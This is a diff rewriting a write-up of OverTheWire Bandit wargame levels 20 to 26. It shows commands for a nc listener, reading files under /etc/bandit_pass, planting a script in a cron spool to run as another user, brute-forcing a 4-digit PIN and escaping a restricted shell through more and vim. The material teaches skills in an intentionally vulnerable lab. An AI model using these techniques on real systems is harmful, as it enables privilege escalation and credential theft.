@@ -1,30 +1,27 @@
 # Bandit CTF Writeups: Levels 20 to 26
 
-**Host:** `bandit.labs.overthewire.org`  
-**Port:** `2220`
+OverTheWire Bandit wargame solutions — objectives, commands, and notes.
+
+**Host:** `bandit.labs.overthewire.org` | **Port:** `2220`
 
 ---
 
-# Bandit Level 20 → 21
+## Level 20 → 21
 
-## Goal
-Use a setuid binary `suconnect` that connects to a port you specify, reads a password, and if it matches bandit20's password, sends back bandit21's password.
-
-## Solution
+A setuid binary `suconnect` connects to a port you specify, reads a password, and returns the next one if it matches.
 
 ```bash
 echo "bandit20_password" | nc -l -p 4444 &
 ./suconnect 4444
 ```
 
+The `&` backgrounds the listener so you can run `suconnect` in the same terminal.
+
 ---
 
-# Bandit Level 21 → 22
+## Level 21 → 22
 
-## Goal
-A cron job runs periodically as bandit22. Find what it does and use it to get the password.
-
-## Solution
+A cron job runs as bandit22 every minute and writes the password to a world-readable `/tmp` file.
 
 ```bash
 ls -la /etc/cron.d/
@@ -35,40 +32,33 @@ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
 
 ---
 
-# Bandit Level 22 → 23
+## Level 22 → 23
 
-## Goal
-A cron job runs as bandit23 and writes the password to a `/tmp` file named after an md5 hash. Figure out the filename and read it.
-
-## Solution
+A cron job runs as bandit23 and writes the password to `/tmp/<md5hash>`. Reproduce the hash to find the filename.
 
 ```bash
 cat /usr/bin/cronjob_bandit23.sh
 mytarget=$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
-echo $mytarget
 cat /tmp/$mytarget
 ```
 
+Write `bandit23` as a plain string — `$bandit23` expands to nothing.
+
 ---
 
-# Bandit Level 23 → 24
+## Level 23 → 24
 
-## Goal
-A cron job runs as bandit24 and executes then deletes any script in `/var/spool/bandit24/foo` owned by bandit23. Write a script that copies the password out.
-
-## Solution
+A cron job runs as bandit24 and executes any script in `/var/spool/bandit24/foo` owned by bandit23, then deletes it.
 
 ```bash
-cat /usr/bin/cronjob_bandit24.sh
-
 mktemp -d
 chmod 777 /tmp/tmp.XXXXXX
 cd /tmp/tmp.XXXXXX
-
 nano test.sh
 ```
 
 Contents of `test.sh`:
+
 ```bash
 #!/bin/bash
 cat /etc/bandit_pass/bandit24 > /tmp/tmp.XXXXXX/pwd24.txt
@@ -77,17 +67,17 @@ cat /etc/bandit_pass/bandit24 > /tmp/tmp.XXXXXX/pwd24.txt
 ```bash
 chmod +x test.sh
 cp test.sh /var/spool/bandit24/foo
+# wait up to a minute, then:
 cat /tmp/tmp.XXXXXX/pwd24.txt
 ```
 
+`chmod 777` on your tmp dir is required so bandit24 can write the output file back.
+
 ---
 
-# Bandit Level 24 → 25
+## Level 24 → 25
 
-## Goal
-A daemon on port 30002 requires the bandit24 password plus a secret 4-digit PIN (0000–9999). Brute-force all 10000 combinations to find the correct one.
-
-## Solution
+A daemon on port 30002 requires the bandit24 password plus a secret 4-digit PIN. Brute-force all 10000 combinations.
 
 ```bash
 for i in {0000..9999}; do
@@ -95,47 +85,38 @@ for i in {0000..9999}; do
 done | nc localhost 30002 | grep -vi "wrong"
 ```
 
+All combinations are piped into a single `nc` connection. `grep -vi "wrong"` filters failed attempts, leaving the success line.
+
 ---
 
-# Bandit Level 25 → 26
+## Level 25 → 26
 
-## Goal
-Log into bandit26 using the SSH key provided. bandit26's shell is not `/bin/bash` — figure out what it is and how to escape it.
-
-## Solution
+bandit26's login shell is a script that runs `more ~/text.txt` and exits immediately — unless the terminal is too small to display the file at once.
 
 ```bash
-cat /etc/passwd | grep bandit26
-
-
+grep bandit26 /etc/passwd
 cat /usr/bin/showtext
+```
 
+Shrink your terminal window vertically so `more` is forced into pager mode, then SSH in.
 
+```bash
 ssh -i bandit26.sshkey bandit26@bandit.labs.overthewire.org -p 2220
+```
 
-# 5. While in `more` pager, press v to open vim
-# 6. In vim, set the shell and open it:
+Inside `more`, press `v` to open vim, then escape to a shell:
+
+```
 :set shell=/bin/bash
 :shell
 ```
 
-You now have a shell as bandit26.
-
-----
-
-# Bandit Level 26 → 27
-
-## Goal
-Use a setuid binary in the home directory to read the password for bandit27.
-
-## Solution
-
-```bash
-./bandit27-do
-
-
-./bandit27-do cat /etc/bandit_pass/bandit27
-```
-
 ---
 
+## Level 26 → 27
+
+Same setuid pattern as level 19→20. The binary `bandit27-do` runs as bandit27.
+
+```bash
+./bandit27-do cat /etc/bandit_pass/bandit27
+```
